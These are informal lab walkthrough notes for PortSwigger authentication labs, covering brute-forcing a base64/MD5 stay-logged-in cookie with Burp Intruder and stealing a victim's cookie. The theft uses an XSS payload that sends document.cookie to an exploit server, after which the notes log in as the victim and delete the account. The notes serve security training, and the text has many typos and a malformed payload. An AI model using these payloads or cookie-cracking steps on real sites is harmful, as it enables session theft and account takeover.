
# Vulnerabilities in password-based login
 
Reference: [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

---
# Vulnerabilities in other authentication mechanisms


Reference: [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

### Steps:
1. Log in your account with you credentials `wiener:peter` and tick the box of stay log in
   
2. After this when you go to burpsuite and you will see POST /login method in which you have your credentials and in response you got 
	- set-cookie: stay-logged-in=dsfs  |This is your cookie which keep you stay log in even when you close the browser
	- set-cookie: session=sdfk | This is your session cookies

3. Now take Stay-logged-in cookie and decode this using decoder in burp, By bas64 and you will get this type of decode: base64(username:23e43d24r) 
	- '23e43d24r' This is md5 has and when you crack this you will see that it is password
	- formate is: username:password = stay-logged-in

4. Now you have to brute force the cookie, you know base64(username:md5(password))
	- Send GET /my-account request to intruder and remove session cookie
	- and add payload to stay-logged-in
	- past the password list and make rules->
		- turn every password into md5
		- add prefix - carlos:
		- base60-encoding
	- Now start attack

5. Check for the length of brutforce and past the cookie in stay-logged-in section

There you go!!!

---

Reference: [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)  

### Steps:
1. This website is xxs vulnerable and we need to find carlos stay-log-in cookie using xss and after decoding carlos cookie we will get his password.
   
2. First I log in my account and after that i log out, when you see stay-log-in cookie you will se that cookie is not any random cookie.
	- You take cookie and decode by base64 you get username:md5
	- after crakig md5 you get -  password
	  
3. Now check for XXS Vulnerablility which i can find in post comment funcationality
   
4. Payload: `<script>document.location="exploit-server"+document.cookie"</script>`

5. Now i will check access log of exploit server and you see another victim cookie

6. Now we will decode that 
	- First by burpuite decoder: username:md5
	- Second has cracker: password

7. log in with username and password and delet the victim account 

There you go!!!

---
